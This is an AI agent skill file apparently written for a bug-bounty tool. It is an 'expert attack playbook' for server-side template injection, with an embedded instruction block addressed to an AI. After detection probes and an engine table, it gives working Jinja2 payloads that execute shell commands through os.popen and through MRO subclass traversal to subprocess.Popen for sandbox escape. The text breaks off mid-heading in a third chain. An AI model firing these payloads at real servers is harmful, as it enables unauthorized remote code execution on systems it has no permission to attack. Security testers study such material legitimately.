---
name: ssti-server-side-template-injection
description: SSTI playbook. Use when template expressions, server-side rendering, preview features, or templating engines may evaluate attacker-controlled content.
scope: web2
---
SSTI playbook. Use when template expressions, server-side rendering, preview features, or templating engines may evaluate attacker-controlled content.

# SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSTI techniques. Covers polyglot detection probes, engine fingerprinting, Jinja2/FreeMarker/Twig/ERB RCE chains, client-side Angular SSTI, and bypass techniques. Base models often miss sandbox escape MRO chains and non-Jinja2 engines. For PHP CMS template eval, Jira SSTI, Confluence OGNL, and Spring Cloud Gateway SpEL, load the companion [SCENARIOS.md](./SCENARIOS.md).


## 1. DETECTION — POLYGLOT PROBE SEQUENCE

First test: distinguish SSTI from XSS. Send these probes and check if **math is evaluated** server-side:

{{7*7}}        → IF returns 49 (not {{7*7}}) → Jinja2 or Twig
${7*7}         → IF returns 49 → FreeMarker, Velocity, or Java EL
#{7*7}         → Ruby (ERB interpolation in strings)
<#assign x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL (*{...})

**Jinja2 vs Twig disambiguation**:
{{7*'7'}}
→ 7777777  = Jinja2 (Python string multiplication)
→ 49       = Twig (PHP numeric)

**Safe detection probe** (no math, just boolean):
{{''.__class__}}   → class 'str' = Python/Jinja2

---

## 2. ENGINE-TO-LANGUAGE MAPPING

| Template Engine | Language | Framework |
|---|---|---|
| Jinja2 | Python | Flask, FastAPI |
| Django Templates | Python | Django |
| Mako | Python | Pyramid |
| Twig | PHP | Symfony, Laravel |
| Smarty | PHP | Various |
| FreeMarker | Java | Spring MVC |
| Velocity | Java | Various Java |
| Pebble | Java | Various Java |
| Thymeleaf | Java | Spring Boot |
| ERB | Ruby | Rails |
| Slim / Haml | Ruby | Rails |
| Jade / Pug | Node.js | Express |
| Handlebars | Node.js | Express |
| Tornado | Python | Tornado |

Identifying language from errors → then narrow to template engine.

---

## 3. JINJA2 (PYTHON FLASK) — RCE CHAINS

### Chain 1: os module via __globals__
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

### Chain 2: MRO subclass traversal (sandbox escape)
# List all subclasses:
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index (usually around 258-270, varies by Python version):
# Look for "subprocess.Popen" in the list

# Execute command (replace [258] with correct index):
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}

### Chain 3: request object gl
...

## References
- Source: https://github.com/yaklang/hack-skills/blob/main/skills/ssti-server-side-template-injection/SKILL.md
- License: MIT — Copyright (c) 2026 VillanCh
- Distilled for bbhunter by scripts/import_hack_skills.py
